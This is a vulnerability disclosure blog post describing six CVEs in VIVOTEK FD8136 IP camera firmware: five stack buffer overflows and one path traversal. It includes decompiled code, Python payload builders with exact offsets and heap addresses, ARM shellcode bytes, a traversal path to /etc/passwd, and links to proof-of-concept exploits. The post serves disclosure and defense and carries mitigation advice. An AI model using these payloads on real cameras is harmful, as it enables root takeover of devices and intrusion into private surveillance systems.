---
layout: post
title: "6 Vulnerabilities in the VIVOTEK FD8136 IP Camera"
date: 2026-05-19 09:30:00 -0000
tags: [cve, vivotek, iot, buffer-overflow, path-traversal, rce, lfi]
description: "Six vulnerabilities in VIVOTEK FD8136 firmware FD8136-VVTK-0300a: one pre-auth RCE, four post-auth RCEs, and one post-auth arbitrary file read."
---

# Background

VIVOTEK is a Taiwanese manufacturer of IP cameras and related surveillance equipment.
I recently spent some time reversing the firmware for one of their old FD8136 cameras running firmware `FD8136-VVTK-0300a`.
That work turned up six vulnerabilities:

| CVE | Class | Endpoint | Auth | Impact |
| --- | --- | --- | --- | --- |
| `CVE-2026-30649` | Stack buffer overflow | `/cgi-bin/anonymous/setparam.cgi` | No | Pre-auth RCE as root |
| `CVE-2026-30650` | Stack buffer overflow | `/cgi-bin/admin/eventtask.cgi` | Yes | Post-auth RCE as root |
| `CVE-2026-30652` | Stack buffer overflow | `/cgi-bin/dido/setdo.cgi` | Yes | Post-auth RCE as root |
| `CVE-2026-35716` | Stack buffer overflow | `/cgi-bin/admin/setpm.cgi` | Yes | Post-auth RCE as root |
| `CVE-2026-35717` | Stack buffer overflow | `/cgi-bin/admin/export_language.cgi` | Yes | Post-auth RCE as root |
| `CVE-2026-35718` | Path traversal | `/cgi-bin/admin/downloadMedias.cgi` | Yes | Arbitrary file read |

Five of the six issues are memory corruption bugs in CGI handlers exposed by the camera's web interface.
The sixth is a shell-script path traversal that makes it trivial to read files outside the intended media directory.

# Protecting Yourself

If you still operate one of these devices, assume it is unsafe to expose it directly to untrusted networks.
`CVE-2026-30649` is pre-authentication and yields code execution as root, so if you have one of these exposed to the public internet, assume it is compromised and decommission it.
The other bugs require authentication, but the device uses HTTP Basic Auth and the vulnerable handlers still execute as root, so post-auth compromise is effectively full-device compromise.

The practical defensive options are limited:

- Remove affected devices from internet exposure.
- Restrict management access to a dedicated internal network.
- Rotate credentials if the device has ever been reachable from untrusted networks.
- Treat the device as untrusted if it cannot be replaced.


# CVE-2026-30649: Pre-Authentication Overflow in `set_getparam.cgi`

`/cgi-bin/anonymous/setparam.cgi` is the most serious issue in the set because it is reachable without authentication.
This path is just a symlink to the same `set_getparam.cgi` handler used elsewhere.

The main function of `set_getparam.cgi` creates a heap allocation for the request body and copies the contents of the body into that buffer.
No bounds on the size of the body are enforced by `get_request_data`: any-size body is permitted, and the heap buffer is returned.
The function for the correct CGI endpoint is then looked up in a table, and called with the request body as the sole argument.

```c
undefined4 main(int argc,char **argv)
{
    ...
    cgi_command_function = (code *)(&cgi_command_function_ptr_table)[function_table_index * 2];
    request_data = (char *)get_request_data(stdin,method);
    if (request_data != (char *)0x0) {
        sVar2 = strlen(request_data);
        EscapeDecodeString(request_data,sVar2,request_data,auStack_1c,1);
    }
    command_result = (*cgi_command_function)(request_data);
    ...
}
```

In the `setparam_cgi` endpoint handler function there are some basic checks on `request_data`, none of which verify the size; the body in `request_data` is then passed on to `set_get_param`.
```c
int setparam_cgi(char *request_data)

{
  char *return_param;
  char *return_param_first_slash;
  int iVar1;
  void *local_1c [2];
  
  local_1c[0] = (void *)0x0;
  if (request_data == (char *)0x0) {
    return_param_first_slash = (char *)0x0;
  }
  else {
    ...
    if (*request_data != '\0') {
      iVar1 = set_get_param(request_data,"JavaScript",0,0,local_1c);
      goto LAB_00009b9c;
    }
  }
  iVar1 = set_get_param("root","JavaScript",0,0,local_1c);
  ...
}
```

Again in `set_get_param` no checks on size are performed and request data is then used to write to a buffer on the stack using `sprintf`, a common unsafe C API which does not perform any sort of bounds checks.
This allows an attacker to overflow into the stack metadata and take control of the instruction pointer.

```c
int set_get_param(char *request_data,undefined4 param_2,undefined4 param_3,int param_4, undefined4 *value)
{
    char sprintf_stack_buff;
    char 4k_buffer[4096];
    ...
    sVar1 = sprintf(&sprintf_stack_buff,"set %s %d %d %d\n%s",param_2,match,1,param_3,request_data);
    ...
}
```

Exploitation of this bug is straightforward because the protections of this machine are very minimal.
Specifically for our exploitation the heap is not randomized (for this binary it is created at `0x00016000`), and is executable.
Moreover, it happens to contain our payload immediately after the first 8 bytes of `malloc` metadata.
This allows us to just set our return address to the fixed heap address plus 8, i.e. `0x00016008`, where our shellcode will be placed.

```python
# Code used to generate our payload
DEFAULT_HEAP_BUFFER_ADDR = 0x00016008
# This shellcode just runs `sleep 6000`, writing some null-free ARM reverse shellcode is an exercise for the reader!
DEFAULT_SHELLCODE = (
    b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x52\x40\x82\x72\x04\x4a\x10\x47"
    b"\xc0\x46\x73\x6c\x65\x65\x70\x20\x36\x30\x30\x30\x58\x58\x5c\x65\x05\x40"
)


def build_payload(shellcode: bytes, heap_buffer_addr: int) -> bytes:
    return shellcode + (b"\xAA" * (0x120D - len(shellcode))) + struct.pack("<I", heap_buffer_addr)

```

PoC: [CVE-2026-30649](https://github.com/xchg-rax-rax/vivotek-fd8136-pocs/tree/main/CVE-2026-30649)

# CVE-2026-30650: Post-Auth Overflow in `eventtask.cgi`

`/cgi-bin/admin/eventtask.cgi` manages event task configuration on the camera.
Like the other vulnerable CGI handlers in this firmware, it trusts attacker-controlled POST data far too much.

The issue here is another classic stack overflow.
When the binary handles a POST request, it reads the raw request body from `stdin` into a fixed-size stack buffer of about `0x88` bytes and does not verify that the supplied `Content-Length` fits in that buffer.
Once the request body exceeds that size, the copy runs off the end of the stack buffer and overwrites the saved link register.

This makes exploitation fairly direct.
The PoC again uses request-controlled shellcode placed in memory and then overwrites the saved return target with a fixed heap address for this firmware build:

```python
DEFAULT_HEAP_BUFFER_ADDR = 0x00012008

def build_payload(shellcode: bytes, heap_buffer_addr: int) -> bytes:
    return shellcode + (b"A" * (0x88 - len(shellcode))) + b"\x08\x20\x01=" + struct.pack(
        "<I", heap_buffer_addr
    )
```

The important details are:

- the overwrite distance is roughly `0x88` bytes,
- the endpoint is authenticated but still runs as root,
- the exploit returns into shellcode staged in request-controlled memory,
- no stack canaries or modern hardening get in the way on this target.

So while this is not remotely reachable without credentials, it is still a full post-auth root compromise.

PoC: [CVE-2026-30650](https://github.com/xchg-rax-rax/vivotek-fd8136-pocs/tree/main/CVE-2026-30650)

# CVE-2026-30652: Post-Auth Overflow in `setdo.cgi`

`/cgi-bin/dido/setdo.cgi` is not a standalone handler.
In the firmware it is a symlink to `set_getdido.cgi`, which also backs other DI/DO functionality:

- `/cgi-bin/dido/setdo.cgi` -> `set_getdido.cgi`
- `/cgi-bin/dido/getdi.cgi` -> `set_getdido.cgi`
- `/cgi-bin/dido/getdo.cgi` -> `set_getdido.cgi`

The vulnerable route is the published `setdo.cgi` path, but the underlying bug lives in `set_getdido.cgi`.
When processing a POST request, that binary reads the raw body into a fixed-size stack buffer of roughly `0xc4` bytes without validating the supplied length against the capacity of the destination buffer.
An oversized request therefore overwrites saved stack metadata, including the saved link register.

The PoC uses the same exploitation strategy as the other FD8136 memory corruption bugs:

```python
DEFAULT_HEAP_BUFFER_ADDR = 0x00013008

def build_payload(shellcode: bytes, heap_buffer_addr: int) -> bytes:
    return shellcode + (b"A" * (0xC4 - len(shellcode))) + struct.pack("<I", heap_buffer_addr)
```

That tells us the main properties of the bug:

- the overwrite point is around `0xc4` bytes,
- the endpoint is authenticated,
- the saved link register is overwritten with a fixed executable heap address,
- control flow returns directly into attacker-supplied shellcode.

This is another post-auth root RCE, this time on the camera's digital input/output configuration interface.

PoC: [CVE-2026-30652](https://github.com/xchg-rax-rax/vivotek-fd8136-pocs/tree/main/CVE-2026-30652)

# CVE-2026-35716: Post-Auth Overflow in `motion_privacy.cgi`

`motion_privacy.cgi` backs multiple published endpoints:

- `/cgi-bin/admin/setpm.cgi`
- `/cgi-bin/admin/setmd.cgi`
- `/cgi-bin/admin/setmd_profile.cgi`

The accompanying PoC targets the `n1` parameter specifically and builds the payload around the stack layout used by this firmware:

```python
DEFAULT_HEAP_BUFFER_ADDR = 0x0001500C

def build_payload(shellcode: bytes, heap_buffer_addr: int) -> bytes:
    return b"n1=A" + shellcode + (b"A" * (0xA4 - 1 - len(shellcode))) + struct.pack(
        "<I", heap_buffer_addr
    )
```

That payload shape tells you most of what matters:

- The vulnerable field is `n1`.
- The overwrite distance to the saved link register is approximately `0xa4` bytes.
- The exploit again returns into shellcode already staged in request-controlled memory.

Because the endpoint is HTTP Basic Auth protected, this is post-auth rather than pre-auth.
But once authenticated, the attacker reaches a root-running CGI binary with no meaningful mitigation against classic stack smashing.

PoC: [CVE-2026-35716](https://github.com/xchg-rax-rax/vivotek-fd8136-pocs/tree/main/CVE-2026-35716)


# CVE-2026-35717: Post-Auth Overflow in `export_language.cgi`

`export_language.cgi` contains a second request-body parsing bug, this time in the language export path.
As with `set_getparam.cgi`, the helper reads POST data from the request without any bounds checks and then uses it almost immediately in a `memcpy` into a stack buffer:

```c
void main()
{
    ...
    variable_name_end = getenv("REQUEST_METHOD");
    request_content = (char *)read_request_content(stdin,variable_name_end);
    variable_name_end = strchr(request_content,L'=');
    if (variable_name_end != (char *)0x0) {
        // this is just pathetic
        variable_name_len = (int)(variable_name_end + 1) - (int)request_content;
        memcpy(&cStack_1a,variable_name_end + 1,variable_name_len);
        ...
    }
    ...
}
```

The PoC is enough to show the overwrite geometry:

```python
DEFAULT_HEAP_BUFFER_ADDR = 0x00012008

def build_payload(shellcode: bytes, heap_buffer_addr: int) -> bytes:
    return shellcode + (b"A" * (0x60 - len(shellcode))) + b"=" + (b"D" * 22) + struct.pack(
        "<I", heap_buffer_addr
    )
```

Here the saved return target sits after roughly `0x60` bytes of stack data.
The attack pattern mirrors the previous bugs:

- authenticate to the admin endpoint,
- send a crafted POST body,
- overflow the stack frame,
- overwrite the saved link register,
- redirect execution into shellcode placed in request-controlled memory.

What makes this family of bugs noteworthy is how repetitive the failure mode is.
Different CGI handlers were clearly written by different people or at different times, but they all assume attacker-controlled HTTP input is small and well-formed.
On a device like this, that assumption is enough to turn administrative functionality into root code execution.

PoC: [CVE-2026-35717](https://github.com/xchg-rax-rax/vivotek-fd8136-pocs/tree/main/CVE-2026-35717)

# CVE-2026-35718: Path Traversal in `downloadMedias.cgi`

The final issue is much simpler, but still dangerous.
`downloadMedias.cgi` is a shell script intended to let authenticated users download media files from `/mnt/auto/`.
The script tries to enforce that prefix, but gets the check wrong:

```sh
PREFIX="/mnt/auto/"
...
strparam=`decode.sh "$strparam"`

len=${#PREFIX}
if [ "$(echo "$strparam" | cut -c0-$len)" != "$PREFIX" ] ;then
    echo -ne "Content-type: text/plain\r\n\r\n"
    echo -ne "Permission denied"
    exit 0
fi
...
cat "$strparam">&1
```
Note that `$strparam` contains our user-supplied data; no escaping is done by `decode.sh`.
As can be seen in this snippet, the only check that is performed on the path is that it begins with `/mnt/auto/`.
No thought or consideration of path traversal went into the design of this endpoint.
This means a path such as:

```text
/mnt/auto/../../../etc/passwd
```

bypasses the prefix check, because its first ten characters are still `/mnt/auto/`.
But when the script later hands the full string to `cat`, the shell resolves the traversal and opens the real target outside the intended directory.

The PoC uses exactly that construction:

```python
PREFIX = "/mnt/auto/"
TRAVERSAL = "../../../"

def build_payload(target_file: str) -> str:
    return PREFIX + TRAVERSAL + target_file.lstrip("/")
```

This is only a file-read bug, not code execution, but on an embedded Linux camera that is still serious.
Arbitrary read access typically exposes:

- `/etc/passwd`
- network configuration
- stored credentials
- device configuration files under flash-backed storage

In practice, arbitrary file read is often enough to turn a post-auth bug into durable compromise or to support later lateral movement.

# Disclosure

I attempted to report these issues to VIVOTEK prior to publication, but received no response to my correspondence.

# Closing Notes

None of these bugs are especially exotic, and that is precisely the problem.
This firmware exposes unauthenticated and authenticated CGI handlers that trust HTTP input far too much, and because those handlers run with root privileges they allow total compromise of the device.
Taken together, they are a good reminder that IP-camera firmware should not be trusted without first performing a detailed security audit of it.

# References

- PoCs: [xchg-rax-rax/vivotek-fd8136-pocs](https://github.com/xchg-rax-rax/vivotek-fd8136-pocs)
